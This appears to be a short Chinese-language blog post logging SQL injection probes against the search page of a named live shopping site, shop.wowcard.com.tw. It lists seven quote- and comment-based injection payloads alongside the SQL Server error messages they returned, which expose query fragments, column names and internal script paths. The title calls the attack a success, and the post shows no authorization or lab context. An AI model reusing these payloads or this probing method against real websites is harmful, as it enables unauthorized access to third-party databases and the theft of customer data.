---
title: SQL Injection wowcard Success
description: SQL Injection wowcard Success
---

## 前言

- 目標: `https://shop.wowcard.com.tw/wsearch.asp`
- 使用 POST + FormData，不需要煩惱 URL Encode + Decode 的問題

## 測試過程

1. `'`

```
Microsoft OLE DB Provider for SQL Server 錯誤 '80040e14'

遺漏字元字串 ') Order By 上刊日期 desc' 後面的引號。

/Scripts/DataList_WOWdetail.js, 行318
```

2. `123'`

```
Microsoft OLE DB Provider for SQL Server 錯誤 '80040e14'

接近 '%' 之處的語法不正確。

/Scripts/DataList_WOWdetail.js, 行318
```

3. `%123'--123`

```
Microsoft OLE DB Provider for SQL Server 錯誤 '80040e14'

接近 '%%123' 之處的語法不正確。

/Scripts/DataList_WOWdetail.js, 行318
```

4. `123'--123`

```
Microsoft OLE DB Provider for SQL Server 錯誤 '80040e14'

接近 '%123' 之處的語法不正確。

/Scripts/DataList_WOWdetail.js, 行318
```

5. `123'))--123`

```
Microsoft OLE DB Provider for SQL Server 錯誤 '80040e14'

接近 ')' 之處的語法不正確。

/Scripts/DataList_WOWdetail.js, 行318
```

6. `123')--123`

```
Microsoft OLE DB Provider for SQL Server 錯誤 '80040e14'

接近 ')' 之處的語法不正確。

/Html_Inc/Search_main_kind.asp, 行18
```

7. `123')'--123`

```
Microsoft OLE DB Provider for SQL Server 錯誤 '80040e14'

接近 '--123%' 之處的語法不正確。

/Scripts/DataList_WOWdetail.js, 行318
```
